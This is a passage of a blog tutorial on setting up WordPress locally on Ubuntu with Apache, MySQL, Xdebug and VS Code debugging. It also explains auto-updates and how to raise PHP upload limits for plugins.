/srv/www # Download the latest WordPress package from the official site # Extract it into /srv/www curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www To download a specific version:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Installing from wordpress.org is the most reliable method:\nUbuntu provides a wordpress package in its repo, but it‚Äôs usually outdated compared to the official release. The WordPress community only supports the official release. If you encounter issues with the Ubuntu package, they won‚Äôt help. Configure Apache for WordPress Create /etc/apache2/sites-available/wordpress.conf:\n\u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks AllowOverride Limit Options FileInfo DirectoryIndex index.php Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Enable WordPress site:\nsudo a2ensite wordpress Enable mod_rewrite:\nsudo a2enmod rewrite Disable default site (optional):\nsudo a2dissite 000-default Or add ServerName mywordpress.local in VirtualHost and update your system‚Äôs hosts file.\nReload Apache:\nsudo service apache2 reload Configure Database Open MySQL:\nsudo mysql -u root Create DB and user:\nCREATE DATABASE wordpress; CREATE USER wordpress@localhost IDENTIFIED BY \u0026#39;\u0026lt;your-password\u0026gt;\u0026#39;; GRANT SELECT,INSERT,UPDATE,DELETE,CREATE,DROP,ALTER ON wordpress.* TO wordpress@localhost; FLUSH PRIVILEGES; quit Restart MySQL:\nsudo service mysql start Configure WordPress DB Connection Copy and edit config:\nsudo -u www-data cp /srv/www/wordpress/wp-config-sample.php /srv/www/wordpress/wp-config.php Update DB info:\nsudo -u www-data sed -i \u0026#39;s/database_name_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/username_here/wordpress/\u0026#39; /srv/www/wordpress/wp-config.php sudo -u www-data sed -i \u0026#39;s/password_here/\u0026lt;your-password\u0026gt;/\u0026#39; /srv/www/wordpress/wp-config.php Add secret keys/salts from: https://api.wordpress.org/secret-key/1.1/salt/\nConfigure WordPress Visit http://localhost and set site title, username, password, email for the admin user.\nSetup Debug on VSCode To understand request flow, we need debugging.\nAdd PHP Debug Extension In VS Code Extensions (Ctrl+Shift+X) =\u0026gt; search PHP Debug (by Felix Becker) =\u0026gt; Install.\nInstall Xdebug sudo apt install php-xdebug -y php -v If you see with Xdebug v3.x.x, installation is OK.\nConfigure Xdebug Edit php.ini:\nzend_extension=xdebug.so xdebug.mode=debug xdebug.start_with_request=yes xdebug.client_host=127.0.0.1 xdebug.client_port=9003 Restart Apache:\nsudo systemctl restart apache2 Configure VSCode launch.json Open project in VS Code:\ncode /srv/www/wordpress Add launch.json:\n{ \u0026#34;version\u0026#34;: \u0026#34;0.2.0\u0026#34;, \u0026#34;configurations\u0026#34;: [ { \u0026#34;name\u0026#34;: \u0026#34;Listen for Xdebug\u0026#34;, \u0026#34;type\u0026#34;: \u0026#34;php\u0026#34;, \u0026#34;request\u0026#34;: \u0026#34;launch\u0026#34;, \u0026#34;port\u0026#34;: 9003, \u0026#34;pathMappings\u0026#34;: { \u0026#34;/srv/www/wordpress\u0026#34;: \u0026#34;${workspaceFolder}\u0026#34; } } ] } Now WordPress is fully set up locally with VS Code debugging.\nExtend Required Version Each WordPress version requires a compatible PHP version. Check this to avoid setup errors.\nWordPress Auto Update Since WordPress 3.7 (2013), background automatic updates exist for:\nSecurity releases Maintenance releases Not for major versions (unless explicitly enabled) WordPress checks api.wordpress.org for updates and applies them automatically.\nTo disable auto-updates, add in wp-config.php:\ndefine( \u0026#39;WP_AUTO_UPDATE_CORE\u0026#39;, false ); Increase Uploadable Plugin Size By default, WordPress relies on PHP configuration (upload_max_filesize, post_max_size, and sometimes max_execution_time) to determine the maximum file size that can be uploaded. On many servers, this limit is set as low as 2MB ‚Äì 8MB, which is not enough for modern plugins.\nWhy Increase the Limit? Large plugins: Some plugins such as WooCommerce extensions, page builders, backup tools, or security suites can easily reach 20MB ‚Äì 100MB.\nAvoid errors: If the plugin .zip file exceeds the limit, you‚Äôll see errors like:\n‚ÄúThe uploaded file exceeds the upload_max_filesize directive in php.ini‚Äù Or the upload process fails silently. Ease of use: Increasing the limit allows administrators to upload plugins directly from the WordPress Dashboard without needing FTP/SSH access.\nDevelopment and testing: Developers testing their own plugins (with bundled assets like JS, CSS, images, or libraries) may generate larger .zip files. A higher limit makes local testing smoother.\nHow to Increase Plugin Upload Size There are several methods depending on your hosting environment:\nEdit php.ini (if you control the server)\nupload_max_filesize = 64M post_max_size = 64M max_execution_time = 300 Edit .htaccess (for Apache servers)\nphp_value upload_max_filesize 64M php_value post_max_size 64M php_value max_execution_time 300 php_value max_input_time 300 Update wp-config.php Add before the line /* That's all, stop editing! Happy publishing. */:\n@ini_set( \u0026#39;upload_max_filesize\u0026#39; , \u0026#39;64M\u0026#39; ); @ini_set( \u0026#39;post_max_size\u0026#39;, \u0026#39;64M\u0026#39;); @ini_set( \u0026#39;max_execution_time\u0026#39;, \u0026#39;300\u0026#39; ); üëâ It‚Äôs recommended to set a reasonable value (e.g., 64MB or 128MB). Avoid setting it too high (hundreds of MBs), as it may open the door to abuse (e.g., users uploading excessively large files that overload the server).\n","permalink":"//localhost:1313/posts/2025-09-20-wordpress-local-and-debugging/","summary":"\u003cp\u003e\u003cstrong\u003eWordPress\u003c/strong\u003e is a powerful and the most popular content management system (CMS) that allows you to create, manage, and customize websites and blogs easily. It‚Äôs an open-source CMS, built on PHP, and uses either MySQL or MariaDB databases.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003eReleased in 2003, initially as a blogging platform, later evolved into a full-featured system for websites, online stores, forums, landing pages, etc.\u003c/li\u003e\n\u003cli\u003eToday, more than 40% of websites worldwide run on WordPress.\u003c/li\u003e\n\u003c/ul\u003e\n\u003cp\u003eThere are two versions of WordPress:\u003c/p\u003e","title":"WordPress Local and Debugging"}]